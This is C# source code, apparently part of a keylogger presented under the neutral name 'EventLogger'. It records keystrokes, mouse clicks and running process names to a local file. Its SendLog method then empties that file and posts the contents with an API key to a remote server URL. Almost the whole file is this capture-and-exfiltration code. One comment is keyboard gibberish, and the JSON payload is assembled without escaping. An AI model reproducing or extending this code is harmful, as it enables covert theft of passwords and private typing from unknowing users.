using System.Diagnostics;
using System.Net;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace EventLogger;
// class that handles the logging of events
public class Logger
{
    private String _line;
    private int _strokes; // used to determine when write string on file because the log string is too long
    private DateTime _previousClick = DateTime.Now; // used to determine double-left-click
    private String _processes = ""; // used to determine if a process is running
    private bool _deleting = false;
    private bool _fileTouch = false; // used to determine if the file has been written
    
    public Logger()
    {
        if (!File.Exists(Constants.PATH))
        {
            using (StreamWriter sw = File.CreateText(Constants.PATH))
            {
                sw.WriteLine("[INIT]");
            }	
        }
        _line = "";
        _strokes = 0;
    }

    public void MouseLog(String key)
    {
        if (Constants.LOG_PROCESS_ON_DOUBLE_CLICK && key=="[ML]")
        {
            if (DateTime.Now.Subtract(_previousClick).TotalMilliseconds <= 500)
            {
                key = "[DML]";
                ProcessLog(false);
            }
            _previousClick = DateTime.Now;
        }
        _line += key;
    }
    
    public void KeyLog(String key)
    {
        _line += key;
        _strokes++;
        if (_strokes < Constants.MAX_LOG_LENGTH) return;
        Log();
    }

    private void ProcessLog(bool forced)
    {
        // forced to log the process even if there is no change
        Process[] processes = Process.GetProcesses();
        String newProcesses = String.Join(",",processes
            .Where(p => p.MainWindowTitle.Length > 0)
            .Select(p => p.ProcessName)
            .Distinct()
            .OrderBy(p=>p));
        if (forced || _processes!=newProcesses)
        {
            // if the process has changed, log it
            _line += "<"+DateTime.Now+","+newProcesses+">";
            _strokes++;
        }
        _processes = newProcesses;
    }
    
    private void Log()
    {
        // method that logs the current line asd as sda a sda sd
        if(_deleting) return;
        using (StreamWriter w = File.AppendText(Constants.PATH))
        {
            w.WriteLine(_line);
        }
        _line = "";
        _strokes = 0;
        _fileTouch = true;
    }

    public void SendLog()
    {
        String body = "";
        if (_fileTouch)
        {
            // load body from file and delete it
            _deleting = true;
            using (StreamReader w = File.OpenText(Constants.PATH))
            {
                String line = w.ReadLine();
                while ( line!= null)
                {
                    body += line;
                    line = w.ReadLine();
                }
            }
            File.WriteAllText(Constants.PATH,string.Empty);
            _fileTouch = false;
            _deleting = false;
        }
        ProcessLog(true); // update actual processes
        body = DateTime.Now +" | "+ body + _line;
        _line = "" ;
        Console.WriteLine(body);
        // todo send the log to the server
        // if any error occurs, Log(" $ "timestamp+body)
        HttpResponseMessage response = null;
        try
        {
            using (var client = new HttpClient())
            {
                var rBody = "{\"content\":\"" + body + "\",\"key\":\"" + Constants.API_KEY + "\"}";
                Console.WriteLine(rBody);
                response = client.PostAsync(
                    Constants.API_URL,
                    new StringContent(rBody,
                        Encoding.UTF8,
                        "application/json"))
                    .Result;
                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("Log sent");              
                }
                else
                {
                    Console.WriteLine("Error sending log");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine(ex.Message);
        }
        Console.WriteLine(response);
    }
    
}